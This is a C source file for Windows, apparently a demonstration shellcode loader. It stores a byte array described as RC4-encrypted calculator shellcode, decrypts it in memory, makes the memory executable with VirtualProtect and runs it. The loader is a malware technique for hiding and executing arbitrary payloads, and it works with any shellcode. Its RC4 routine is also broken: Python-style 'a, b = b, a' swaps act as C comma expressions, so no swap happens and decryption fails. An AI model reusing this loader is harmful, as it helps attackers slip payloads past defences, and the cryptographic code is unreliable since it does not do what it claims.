#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

typedef VOID(WINAPI* fnShellcode)();

// Calculator shellcode encrypted with key "CreateThread"
const unsigned char encrypted[] = { 0xfe, 0x4d, 0x8a, 0xea, 0xe4, 0xf3, 0xe3, 0x2c, 0x36, 0x41, 0x0c, 0x0b, 0x29, 0x27, 0xd5, 0xc9, 0xfc, 0xf5, 0xe0, 0x34, 0x99, 0x5b, 0xa0, 0x16, 0x3e, 0x31, 0x1e, 0xe0, 0xc8, 0xa7, 0x84, 0x62, 0x72, 0x3d, 0x12, 0xcc, 0xb4, 0x43, 0x3c, 0xeb, 0xcc, 0xfb, 0x90, 0x3b, 0xf1, 0x2f, 0xa6, 0x08, 0x56, 0x11, 0x00, 0xea, 0xce, 0x2f, 0x1b, 0x35, 0x6f, 0x20, 0x28, 0x23, 0xa1, 0x1e, 0xfd, 0x8d, 0xf0, 0xa4, 0x78, 0x26, 0x3f, 0xa9, 0x63, 0x07, 0x94, 0x1d, 0x25, 0xbb, 0xd8, 0xdc, 0x27, 0x70, 0x4a, 0x9d, 0xf1, 0x0e, 0x19, 0x33, 0x3f, 0xc3, 0xb6, 0x58, 0x65, 0x42, 0xfb, 0x87, 0x37, 0xd4, 0x79, 0x15, 0x99, 0x57, 0x85, 0x3b, 0xb0, 0xea, 0x6e, 0x6e, 0x34, 0x2b, 0x53, 0x73, 0x3f, 0x60, 0x9b, 0xdb, 0xcc, 0xc7, 0xa5, 0xab, 0x6a, 0x14, 0xe2, 0x88, 0x84, 0x0b, 0x4d, 0xfe, 0x3e, 0x01, 0x7a, 0x25, 0x3c, 0x3f, 0x18, 0xd8, 0x2f, 0xc8, 0x7e, 0x44, 0xb4, 0xcb, 0xdd, 0xef, 0x9f, 0x1c, 0x61, 0x3d, 0x35, 0xef, 0x3d, 0x03, 0x0d, 0x45, 0x15, 0x35, 0x9d, 0x36, 0x9b, 0xef, 0x53, 0xb9, 0x93, 0xe5, 0x98, 0xf5, 0x20, 0x43, 0x3b, 0x1d, 0x16, 0x30, 0x45, 0x8b, 0x20, 0x79, 0x8e, 0xd2, 0x7b, 0xb5, 0xe0, 0x0f, 0x4d, 0x99, 0x33, 0xb7, 0x02, 0x89, 0x24, 0x70, 0x1f, 0x7f, 0x07, 0x61, 0xbb, 0xff, 0x21, 0xa5, 0xe6, 0x52, 0xd4, 0xb3, 0xe9, 0x1e, 0xf0, 0x32, 0xf2, 0x16, 0xe7, 0xb8, 0x8a, 0x5d, 0x31, 0x06, 0xdc, 0xfb, 0x06, 0xe9, 0x3f, 0x18, 0xf5, 0xd2, 0xf1, 0x35, 0x5e, 0xdb, 0x5d, 0x92, 0x06, 0x0b, 0x7f, 0x4b, 0x8e, 0x56, 0x6c, 0x10, 0x87, 0x8c, 0x8d, 0xba, 0x6a, 0x17, 0x0f, 0x85, 0x42, 0x72, 0x84, 0x9f, 0x9d, 0xe8, 0x84, 0x09, 0x7e, 0x62, 0xf5, 0x7a, 0xc4, 0xc7, 0x91, 0xf7, 0xe6, 0xe4, 0x94, 0xc2, 0xe2, 0x25, 0x6c, 0x3e, 0x18, 0xb9, 0x89, 0x9b, 0x64, 0x18 };

typedef struct {
	unsigned char s[256];
	SIZE_T i, j;
} rc4_state;

VOID rc4Init(rc4_state* state, const char* key, const SIZE_T keyLen)
{
	for (SIZE_T i = 0; i < 256; i++)
		state->s[i] = i;
	SIZE_T j = 0;
	for (SIZE_T i = 0; i < 256; i++) {
		j = (j + state->s[i] + key[i % keyLen]) % 256;
		state->s[i], state->s[j] = state->s[j], state->s[i];
	}
	state->i, state->j = 0, 0;
}

VOID rc4Enc(const char* key, const SIZE_T keyLen, char* src, const SIZE_T srcLen)
{
	// Initialise RC4 state
	rc4_state state = { 0 };
	rc4Init(&state, key, keyLen);

	for (SIZE_T idx = 0; idx < srcLen; idx++) {
		unsigned char k;

		// Generate pseudorandom key byte by rotating rc4 state
		state.i = (state.i + 1) % 256;
		state.j = (state.j + state.s[state.i]) % 256;
		state.s[state.i], state.s[state.j] = state.s[state.j], state.s[state.i];
		SIZE_T kIdx = (state.s[state.i] + state.s[state.j]) % 256;
		k = state.s[kIdx];

		// XOR with the source
		src[idx] = src[idx] ^ k;
	}
}


int main()
{
	SIZE_T shellcodeLen = sizeof(encrypted) * sizeof(char);
	PVOID shellcode = VirtualAlloc(NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (shellcode == NULL) {
		printf("VirtualAlloc failed with error: %d\n", GetLastError());
		return 1;
	}
	DWORD oldProt = NULL;

	// Copy code in
	memcpy(shellcode, encrypted, shellcodeLen);
	rc4Enc("CreateThread", strlen("CreateThread"), (char*)shellcode, shellcodeLen);

	if (VirtualProtect(
		shellcode, shellcodeLen, PAGE_EXECUTE_READWRITE, &oldProt
	) == NULL) {
		printf("VirtualProtect failed with error: %d\n", GetLastError());
		return 1;
	}

	fnShellcode pCalc = (fnShellcode)shellcode;

	pCalc();
	/*if (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)shellcode, NULL, NULL, NULL) == NULL) {
		printf("CreateThread failed with error: %d\n", GetLastError());
		return 1;
	}*/
	return 1;
}
